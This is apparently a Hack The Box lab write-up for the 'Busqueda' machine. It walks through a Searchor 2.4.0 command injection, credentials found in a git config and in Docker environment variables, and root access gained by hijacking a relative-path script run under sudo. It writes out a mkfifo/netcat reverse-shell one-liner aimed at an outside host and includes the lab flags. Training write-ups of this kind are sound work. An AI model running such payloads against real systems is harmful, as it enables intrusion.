Looks like we got a host called `searcher.htb`, let's add it to our `/etc/hosts` file.

```bash
# /etc/hosts
10.10.11.208    searcher.htb
```

I then went on to the website to check what I could find.

## 80/TCP - HTTP

After heading to the website I was greeted with this page:

![](../../../assets/37eb6b8c12ff08921bc5d15fd93885a9.png)

Down at the bottom we find some other details, such as the site being powered by `Flask`, a `python web app framework` and `Searchor 2.4.0` which we will check for exploits:

![](../../../assets/df45da5da5d8c1e98d48926691d66e50.png)

==Exploit==
After looking up vulnerabilities for `Searchor 2.4.0` I found a couple of which I tried [this one first](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection). This is a `Command Injection vulnerability`:

The `Proof of Concept` is pretty straightforward:

![](../../../assets/aab1c7fa939b7f689766992ba1f08526.png)

I proceeded to try it out myself

![](../../../assets/84f3445b3011cb995875f6b4774bf06c.png)

And we're in, easy as that. Here I was able to get the `user.txt` fairly easily by heading into `/home/svc`.

## Flags 

==user.txt==
```bash
svc@busqueda:~$ cat user.txt
cat user.txt
de28a8710e0c34667ec742dd7704587f
```

==root.txt==
Now onto some privilege escalation. I was not allowed to run `sudo -l` as seen below so I had to resort to other ways.

```bash
svc@busqueda:~$ sudo -l
sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
```

After checking the `OS info` I found nothing worth exploiting, so instead I went to take a look at the `/var/www/app/.git` folder which has an interesting `config` file which I took a look at.

```bash
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

We find some new info, we found a user called `cody` together with a password `jh1usoih2bkjaspwe92`, and a subdomain called `gitea.searcher.htb` which I added to my `/etc/hosts` file.

After adding the `subdomain` I headed to the site and proceeded to login with the previously found creds.

![](../../../assets/d8ac9da1a041168a0e999837ed583e5f.png)

I did not find anything which we could use right now so I instead went to login to `SSH` as the `svc` user with the previously found password. Here I could run `sudo -l` since I now had the password.

![](../../../assets/e7d4008413b31c2d34a89ae8c2114706.png)

We see that we are allowed to run a python script in the `/opt/scripts` folder as `root`.
Unfortunately enough we can not view the contents as the file is still owned by root, so I decided to run the file instead to see what `params` it takes:

```bash
sudo python3 /opt/scripts/system-checkup.py *
```

![](../../../assets/d35037f3553a31bb0f6002358c48245f.png)

It appears to be script checking various `containers` and/or the whole system. I ran the `docker-ps` option and it gave me this output:

```bash
svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS          PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   19 months ago   Up 50 minutes   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   19 months ago   Up 50 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

We see that there is a `docker` container running `MySQL` on port `33060` as well as the `gitea` container. Other than that we should try the other commands now. 

I tried the `full-checkup` command but that just did not work for some reason:

```bash
svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py full-checkup 
Something went wrong
```

Then last but not least I tried the `docker-inspect` command.

```bash
svc@busqueda:~$ sudo python3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```

We know the `container_name` param, but we do not know what they mean by `format`. I decided to look it up and found relevant info [here]([docker inspect | Docker Docs](https://docs.docker.com/reference/cli/docker/inspect/)). 

![](../../../assets/a4f0afffd937bb7cac29e3aabfd04c0e.png)

It seems we can just specify the `json` format with the `-f` flag and be on our way, let's see:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
```

Above we specify the `jq` after the pipe in order to output it as a parsed `json` file. By default `jq` should already be installed on the target machine, so no further action is necessary.

This gives us a massive output. Most of this stuff does not mean anything to us except for the `ENV` tab which shows the following:

```json
    "Env": [
      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",                                      
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"
    ],
```

Here we have actually found some `hardcoded credentials` for the `MySQL` database. We can now log into the website as the `administrator` with the given creds. 

![](../../../assets/6a4548b938ddef3f83f11be244c8eca4.png)

Now that we are in as `administrator` we can check out the `/scripts` folder and check the `system-checkup.py` script what it exactly does.

```python
#!/bin/bash
import subprocess
import sys

actions = ['full-checkup', 'docker-ps','docker-inspect']

def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
    if r.stderr:
        output = r.stderr.decode()
    else:
        output = r.stdout.decode()

    return output


def process_action(action):
    if action == 'docker-inspect':
        try:
            _format = sys.argv[2]
            if len(_format) == 0:
                print(f"Format can't be empty")
                exit(1)
            container = sys.argv[3]
            arg_list = ['docker', 'inspect', '--format', _format, container]
            print(run_command(arg_list)) 
        
        except IndexError:
            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
            exit(1)
    
        except Exception as e:
            print('Something went wrong')
            exit(1)
    
    elif action == 'docker-ps':
        try:
            arg_list = ['docker', 'ps']
            print(run_command(arg_list)) 
        
        except:
            print('Something went wrong')
            exit(1)

    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
            

if __name__ == '__main__':

    try:
        action = sys.argv[1]
        if action in actions:
            process_action(action)
        else:
            raise IndexError

    except IndexError:
        print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
        print('')
        print('     docker-ps     : List running docker containers')
        print('     docker-inspect : Inpect a certain docker container')
        print('     full-checkup  : Run a full system checkup')
        print('')
        exit(1)
```

Here I found why the `full-checkup` command was failing, it appears that the script previously failed simply because we were not in the same directory as the `./full-checkup.sh` script. 
I moved on over to the correct folder and then proceeded to run the command again.

```bash
svc@busqueda:~$ find / -type f -name "full-checkup.sh" 2>/dev/null
/opt/scripts/full-checkup.sh
svc@busqueda:~$ cd /opt/scripts/
```

```bash
svc@busqueda:/opt/scripts$ sudo python3 /opt/scripts/system-checkup.py full-checkup

```

The output itself is actually not that important, but rather the function call is interesting. We now understand that in order to run `full-checkup` it is leveraging another script called `full-checkup.sh`. Using this logic we can create our own malicious script with the same name, but in another directory such as the `/tmp` folder where we have `write` access. 

So we `cd` to `/tmp` and start writing our `reverse-shell` script. The script will be a `one-liner` in order to make execution smoother: 

```bash
echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 9001 >/tmp/f" > /tmp/full-checkup.sh
```

Make the script executable.

```bash
chmod +x full-checkup.sh
```

We turn on our listener.

```bash
nc -lvnp 9001
```

And then we simply run the script again:

We can now get the `root` flag:

```bash
cd /root && cat root.txt
4826eddc6ecf6f8ba69c83efe2b8c330
```
